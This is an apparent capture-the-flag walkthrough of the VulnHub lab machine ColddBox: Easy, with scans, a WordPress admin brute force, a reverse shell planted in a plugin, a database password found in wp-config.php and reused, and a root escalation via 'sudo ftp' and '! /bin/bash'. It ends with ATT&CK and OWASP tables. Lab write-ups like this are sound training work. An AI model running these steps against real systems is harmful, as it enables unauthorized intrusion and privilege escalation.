## ColddBox

| **Platform**   | VulnHub                   |
| -------------- | ------------------------- |
| **Machine**    | ColddBox: Easy            |
| **Creator**    | Martin Frias (Aka. C0ldd) |
| **OS**         | Linux                     |
| **Difficulty** | Easy                      |

use `netdiscover` to find the target VM, then use `Nmap`.

```
nmap -sV -sC 10.0.2.32 -p-   
```

| Port | Service | Details                                                       |
| ---- | ------- | ------------------------------------------------------------- |
| 80   | HTTP    | Apache httpd 2.4.18 ((Ubuntu))                                |
| 4512 | SSH     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) |

 use `gobuster` to enumerate directories.

~~~
gobuster dir -u http://10.0.2.32/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js,cgi,xml
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.32/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              xml,php,html,txt,js,cgi
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 301) [Size: 0] [--> http://10.0.2.32/]
wp-content           (Status: 301) [Size: 311] [--> http://10.0.2.32/wp-content/]
wp-login.php         (Status: 200) [Size: 2547]
license.txt          (Status: 200) [Size: 19930]
wp-includes          (Status: 301) [Size: 312] [--> http://10.0.2.32/wp-includes/]
readme.html          (Status: 200) [Size: 7173]
wp-trackback.php     (Status: 200) [Size: 135]
wp-admin             (Status: 301) [Size: 309] [--> http://10.0.2.32/wp-admin/]
hidden               (Status: 301) [Size: 307] [--> http://10.0.2.32/hidden/]
xmlrpc.php           (Status: 200) [Size: 42]
wp-signup.php        (Status: 302) [Size: 0] [--> /wp-login.php?action=register]
server-status        (Status: 403) [Size: 274]
Progress: 1543906 / 1543906 (100.00%)
===============================================================
Finished
===============================================================   
~~~


 in `/hidden/` we can see info about a password change, and some potential users: **hugo**, **philip** and **c0ldd**. the note also seems to imply that **c0ldd** is an admin, or some kind of privileged user.

open the login form at **/wp-login.php/** and bruteforce the password for user **c0ldd**, using `BurpSuite` in `Intruder` mode (can also be done w/ `wpscan` or `hydra`).
 
<img width="1600" height="849" alt="image" src="https://github.com/user-attachments/assets/b7a3b822-0efe-4a88-985b-86ebdeeec7b6" />

<img width="1749" height="913" alt="image" src="https://github.com/user-attachments/assets/768c822e-7b8e-4809-8280-cc6679416304" />

 
now we've got access to the admin console.
looking around, we can see two plugins. 

<img width="1198" height="646" alt="image" src="https://github.com/user-attachments/assets/2079c729-72ab-453d-aa92-fc8d1982a5bf" />


edit one of them to contain the php reverse shell, set up a listener and activate the plugin. stabilize the shell, and look around. we find the **user.txt** flag, but cannot read it due to lacking permissions.
looking around further, in **wp-config.php**, we find what looks like credentials for a db.
 
~~~
www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

==Shortened==
/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
www-data@ColddBox-Easy:/var/www/html$ 
~~~
 
check for password reuse.
~~~
www-data@ColddBox-Easy:/var/www/html$ su c0ldd
su c0ldd
Password: cybersecurity

c0ldd@ColddBox-Easy:/var/www/html$ 
~~~

now we can switch over to `ssh` (making sure to list the correct port!) for a more comfortable experience and get the user flag.
~~~
c0ldd@ColddBox-Easy:~$ cat user.txt
c0ldd@ColddBox-Easy:~$ sudo -l
[sudo] password for c0ldd: 
Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
~~~

listing permissions, we see `ftp` with `sudo`.
connect to `ftp` and spawn an [interactive shell](https://gtfobins.org/gtfobins/ftp/)
~~~
c0ldd@ColddBox-Easy:~$ sudo ftp
ftp> ! /bin/bash
root@ColddBox-Easy:~# 
~~~~

and get the **root** flag.
~~~
root@ColddBox-Easy:/root# cat root.txt
~~~



#### MITRE ATT&CK Mapping

| **Actions**             | **Step**                                                           | **Technique**                                                      |
| ----------------------- | ------------------------------------------------------------------ | ------------------------------------------------------------------ |
| Service discovery       | Scan with Nmap                                                     | T1595 Active scanning                                              |
| Web content discovery   | Directory enumeration with Gobuster                                | T1595.003 Active Scanning: Wordlist Scanning                       |
| Access hidden directory | Access `/hidden/`                                                  | T1594 Search Victim-Owned Websites                                 |
| Credential Access       | Use `BurpSuite Intruder` to bruteforce password for user **c0ldd** | T1110.001 Brute Force: Password Guessing                           |
| Initial Access          | Reverse shell                                                      | T1078.003 Valid Accounts: Local Accounts                           |
| Privilege Escalation    | use `ftp` to spawn interactive shell as **root**                   | T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching |


#### OWASP Vulnerability Table

| **Vulnerability**         | **Impact**                                                                         |
| ------------------------- | ---------------------------------------------------------------------------------- |
| Broken Access Control     | `/hidden/` directory findable and accessible                                       |
| Insecure Design           | username obtained from `/hidden/`, no login attempt limits allowing for bruteforce |
| Security Misconfiguration | `ftp` used to spawn interactive shell as **root**                                  |
